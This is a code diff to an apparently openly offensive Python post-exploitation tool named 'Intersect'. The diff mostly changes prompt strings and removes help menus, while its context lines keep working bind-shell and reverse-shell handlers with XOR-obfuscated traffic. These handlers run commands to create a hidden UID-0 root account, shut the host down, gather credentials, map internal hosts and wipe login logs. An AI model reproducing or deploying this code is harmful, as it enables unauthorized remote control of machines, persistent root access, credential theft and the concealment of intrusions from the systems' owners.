@@ -35,7 +35,6 @@ import getopt
 import tarfile
 import socket
 import urllib2
-import string
 import random, string
 import logging
 import struct
@@ -657,7 +656,7 @@ def bindShell():
         print "[+] Shell bound on 443"
         conn, addr = server.accept()
         print "[+] New Connection: %s" % addr[0]
-        conn.send(xor("\nIntersect: "+str(os.getcwd())+" $ ", pin))
+        conn.send(xor("\nIntersect "+str(os.getcwd())+" >> ", pin))
     except:
         print "[!] Connection closed."
     	sys.exit(2)
@@ -676,18 +675,18 @@ def bindShell():
 	    destination = cmd2[3:].replace('\n','')
             if os.path.isdir(destination):
 	        os.chdir(destination)
-	        conn.send(xor("\nIntersect: "+str(os.getcwd())+" $ ", pin))
+	        conn.send(xor("\nIntersect "+str(os.getcwd())+" >> ", pin))
             elif os.path.isdir(os.getcwd()+destination):
                 os.chdir(os.getcwd()+destination)
-                conn.send(xor("\nIntersect: "+str(os.getcwd())+" $ ", pin))
+                conn.send(xor("\nIntersect "+str(os.getcwd())+" >> ", pin))
             else:
 	        conn.send(xor("[!] Directory does not exist", pin)) 
-	        conn.send(xor("\nIntersect: "+str(os.getcwd())+" $ ", pin))
+	        conn.send(xor("\nIntersect "+str(os.getcwd())+" >> ", pin))
         elif cmd2.startswith('adduser'):
             strip = cmd.split(" ")
             acct = strip[1]
             os.system("/usr/sbin/useradd -M -o -s /bin/bash -u 0 -l " + acct)
-            conn.send(xor("[+] Root account " + acct + " has been created.", pin))   
+            conn.send(xor("[+] Root account " + acct + " has been created.\n", pin))   
         elif cmd2.startswith('upload'):
             getname = cmd2.split(" ")
             rem_file = getname[1]
@@ -715,65 +714,42 @@ def bindShell():
         elif cmd2.startswith("rebootsys"):
             conn.send(xor("[!] Server system is going down for a reboot!", pin))
             os.system("shutdown -h now")
-        elif cmd2 == ("extask"):
-            conn.send(xor("   extask help menu    \n", pin))
-            conn.send(xor("extask osinfo      | gather os info\n", pin))
-            conn.send(xor("extask livehosts   | maps internal network\n", pin))
-            conn.send(xor("extask credentials | user/sys credentials\n", pin))
-            conn.send(xor("extask findextras  | av/fw and extras\n", pin))
-            conn.send(xor("extask network     | ips, fw rules, connections, etc\n", pin))
-            conn.send(xor("extask scrub       | clears 'who' 'w' 'last' 'lastlog'\n", pin))
-            conn.send(xor("\nIntersect: "+str(os.getcwd())+" $ ", pin))
         elif cmd2 == ("extask osinfo"):
             Gather_OS()
             conn.send(xor("\n[+] OS Info Gathering complete.", pin))
             conn.send(xor("\n[+] Reports located in: %s " % Temp_Dir, pin))
-            conn.send(xor("\nIntersect: "+str(os.getcwd())+" $ ", pin))
+            conn.send(xor("\nIntersect "+str(os.getcwd())+" >> ", pin))
         elif cmd2 == ("extask network"):
             NetworkInfo()
             conn.send(xor("\n[+] Network Gather complete.", pin))
             conn.send(xor("\n[+] Reports located in: %s " % Temp_Dir, pin))
-            conn.send(xor("\nIntersect: "+str(os.getcwd())+" $ ", pin))
+            conn.send(xor("\nIntersect "+str(os.getcwd())+" >> ", pin))
         elif cmd2 == ("extask credentials"):
             GetCredentials()
             conn.send(xor("\n[+] Credentials Gather complete.", pin))
             conn.send(xor("\n[+] Reports located in: %s " % Temp_Dir, pin))
-            conn.send(xor("\nIntersect: "+str(os.getcwd())+" $ ", pin))
+            conn.send(xor("\nIntersect "+str(os.getcwd())+" >> ", pin))
         elif cmd2 == ("extask livehosts"):
             NetworkMap()
             conn.send(xor("\n[+] Network Map complete.", pin))
             conn.send(xor("\n[+] Reports located in: %s " % Temp_Dir, pin))
-            conn.send(xor("\nIntersect: "+str(os.getcwd())+" $ ", pin))
+            conn.send(xor("\nIntersect "+str(os.getcwd())+" >> ", pin))
         elif cmd2 == ("extask findextras"):
             FindExtras()
             conn.send(xor("\n[+] Extras Gather complete.", pin))
             conn.send(xor("\n[+] Reports located in: %s " % Temp_Dir, pin))
-            conn.send(xor("\nIntersect: "+str(os.getcwd())+" $ ", pin))
+            conn.send(xor("\nIntersect "+str(os.getcwd())+" >> ", pin))
         elif cmd2 == ("extask scrub"):
             ScrubLog()
             conn.send(xor("\n[+] Scrubbing complete.", pin))
-            conn.send(xor("\nIntersect: "+str(os.getcwd())+" $ ", pin))
-        elif cmd2.startswith('helpme'):
-            conn.send(xor(" Intersect TCP Shell | Help Menu \n", pin))
-            conn.send(xor("---------------------------------\n", pin))
-            conn.send(xor("** download <file> | download file from host\n", pin))
-            conn.send(xor("** upload <file>   | upload file to host\n", pin))
-            conn.send(xor("** isniff <iface>  | start sniffer on <iface>\n", pin))
-            conn.send(xor("** usessh <port>   | enable SSH on <port>\n", pin))
-            conn.send(xor("   extask  <task>  | run Intersect tasks\n", pin))
-            conn.send(xor("   adduser <name>  | add new root account\n", pin))
-            conn.send(xor("   rebootsys       | reboots server system\n", pin))
-            conn.send(xor("   helpme          | show this help menu\n", pin))
-            conn.send(xor("   killme          | shuts down connection\n", pin))
-            conn.send(xor("** = feature not yet fully supported.\n", pin))
-            conn.send(xor("\nIntersect: "+str(os.getcwd())+" $ ", pin))
+            conn.send(xor("\nIntersect "+str(os.getcwd())+" >> ", pin))
         elif cmd2 == ('killme'):
             conn.send(xor("[!] Shutting down shell!\n", pin))
             conn.close()
             sys.exit(0)
         elif proc:
             conn.send(xor( stdout , pin))
-            conn.send(xor("\nIntersect: "+str(os.getcwd())+" $ ", pin))
+            conn.send(xor("\nIntersect "+str(os.getcwd())+" >> ", pin))
 
 
 def reverseShell():
@@ -784,7 +760,7 @@ def reverseShell():
     try:
         conn.connect((RHOST, RPORT))
         conn.send(xor("[+] New connection established!", pin))
-        conn.send(xor("\nIntersect: "+str(os.getcwd())+" $ ", pin))
+        conn.send(xor("\nIntersect "+str(os.getcwd())+" >> ", pin))
     except:
         print("[!] Connection error!")
         sys.exit(2)
@@ -803,13 +779,13 @@ def reverseShell():
 	    destination = cmd2[3:].replace('\n','')
             if os.path.isdir(destination):
 	        os.chdir(destination)
-	        conn.send(xor("\nIntersect: "+str(os.getcwd())+" $ ", pin))
+	        conn.send(xor("\nIntersect "+str(os.getcwd())+" >> ", pin))
             elif os.path.isdir(os.getcwd()+destination):
                 os.chdir(os.getcwd()+destination)
-                conn.send(xor("\nIntersect: "+str(os.getcwd())+" $ ", pin))
+                conn.send(xor("\nIntersect "+str(os.getcwd())+" >> ", pin))
             else:
 	        conn.send(xor("[!] Directory does not exist", pin)) 
-	        conn.send(xor("\nIntersect: "+str(os.getcwd())+" $ ", pin))
+	        conn.send(xor("\nIntersect "+str(os.getcwd())+" >> ", pin))
         elif cmd2.startswith('adduser'):
             strip = cmd.split(" ")
             acct = strip[1]
@@ -842,65 +818,42 @@ def reverseShell():
         elif cmd2.startswith("rebootsys"):
             conn.send(xor("[!] Server system is going down for a reboot!", pin))
             os.system("shutdown -h now")
-        elif cmd2 == ("extask"):
-            conn.send(xor("   extask help menu    \n", pin))
-            conn.send(xor("extask osinfo      | gather os info\n", pin))
-            conn.send(xor("extask livehosts   | maps internal network\n", pin))
-            conn.send(xor("extask credentials | user/sys credentials\n", pin))
-            conn.send(xor("extask findextras  | av/fw and extras\n", pin))
-            conn.send(xor("extask network     | ips, fw rules, connections, etc\n", pin))
-            conn.send(xor("extask scrub       | clears 'who' 'w' 'last' 'lastlog'\n", pin))
-            conn.send(xor("\nIntersect: "+str(os.getcwd())+" $ ", pin))
         elif cmd2 == ("extask osinfo"):
             Gather_OS()
             conn.send(xor("\n[+] OS Info Gathering complete.", pin))
             conn.send(xor("\n[+] Reports located in: %s " % Temp_Dir, pin))
-            conn.send(xor("\nIntersect: "+str(os.getcwd())+" $ ", pin))
+            conn.send(xor("\nIntersect "+str(os.getcwd())+" >> ", pin))
         elif cmd2 == ("extask network"):
             NetworkInfo()
             conn.send(xor("\n[+] Network Gather complete.", pin))
             conn.send(xor("\n[+] Reports located in: %s " % Temp_Dir, pin))
-            conn.send(xor("\nIntersect: "+str(os.getcwd())+" $ ", pin))
+            conn.send(xor("\nIntersect "+str(os.getcwd())+" >> ", pin))
         elif cmd2 == ("extask credentials"):
             GetCredentials()
             conn.send(xor("\n[+] Credentials Gather complete.", pin))
             conn.send(xor("\n[+] Reports located in: %s " % Temp_Dir, pin))
-            conn.send(xor("\nIntersect: "+str(os.getcwd())+" $ ", pin))
+            conn.send(xor("\nIntersect "+str(os.getcwd())+" >> ", pin))
         elif cmd2 == ("extask livehosts"):
             NetworkMap()
             conn.send(xor("\n[+] Network Map complete.", pin))
             conn.send(xor("\n[+] Reports located in: %s " % Temp_Dir, pin))
-            conn.send(xor("\nIntersect: "+str(os.getcwd())+" $ ", pin))
+            conn.send(xor("\nIntersect "+str(os.getcwd())+" >> ", pin))
         elif cmd2 == ("extask findextras"):
             FindExtras()
             conn.send(xor("\n[+] Extras Gather complete.", pin))
             conn.send(xor("\n[+] Reports located in: %s " % Temp_Dir, pin))
-            conn.send(xor("\nIntersect: "+str(os.getcwd())+" $ ", pin))
+            conn.send(xor("\nIntersect "+str(os.getcwd())+" >> ", pin))
         elif cmd2 == ("extask scrub"):
             ScrubLog()
             conn.send(xor("\n[+] Scrubbing complete.", pin))
-            conn.send(xor("\nIntersect: "+str(os.getcwd())+" $ ", pin))
-        elif cmd2.startswith('helpme'):
-            conn.send(xor(" Intersect TCP Shell | Help Menu \n", pin))
-            conn.send(xor("---------------------------------\n", pin))
-            conn.send(xor("** download <file> | download file from host\n", pin))
-            conn.send(xor("** upload <file>   | upload file to host\n", pin))
-            conn.send(xor("** isniff <iface>  | start sniffer on <iface>\n", pin))
-            conn.send(xor("** usessh <port>   | enable SSH on <port>\n", pin))
-            conn.send(xor("   extask  <task>  | run Intersect tasks\n", pin))
-            conn.send(xor("   adduser <name>  | add new root account\n", pin))
-            conn.send(xor("   rebootsys       | reboots server system\n", pin))
-            conn.send(xor("   helpme          | show this help menu\n", pin))
-            conn.send(xor("   killme          | shuts down connection\n", pin))
-            conn.send(xor("** = feature not yet fully supported.\n", pin))
-            conn.send(xor("\nIntersect: "+str(os.getcwd())+" $ ", pin))
+            conn.send(xor("\nIntersect "+str(os.getcwd())+" >> ", pin))
         elif cmd2 == ('killme'):
             conn.send(xor("[!] Shutting down shell!\n", pin))
             conn.close()
             sys.exit(0)
         elif proc:
             conn.send(xor( stdout , pin))
-            conn.send(xor("\nIntersect: "+str(os.getcwd())+" $ ", pin))
+            conn.send(xor("\nIntersect "+str(os.getcwd())+" >> ", pin))
 
 
 
